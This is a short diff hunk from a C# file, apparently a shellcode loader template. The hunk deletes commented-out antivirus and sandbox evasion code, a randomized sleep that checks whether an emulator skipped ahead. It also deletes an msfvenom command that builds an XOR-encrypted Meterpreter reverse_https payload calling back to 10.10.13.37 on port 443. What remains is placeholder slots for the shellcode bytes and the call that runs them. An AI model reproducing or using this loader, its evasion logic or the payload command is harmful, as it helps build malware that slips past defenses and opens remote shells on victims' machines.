@@ -76,19 +76,6 @@ namespace proudcat
                 return;
             }
 
-            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
-            //var rand = new Random();
-            //uint dream = (uint)rand.Next(10000, 20000);
-            //double delta = dream / 1000 - 0.5;
-            //DateTime before = DateTime.Now;
-            //Sleep(dream);
-            //if (DateTime.Now.Subtract(before).TotalSeconds < delta)
-            //{
-            //    Console.WriteLine("Charles, get the rifle out. We're being fucked.");
-            //    return;
-            //}
-
-            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
             byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
 
             //####CALL####
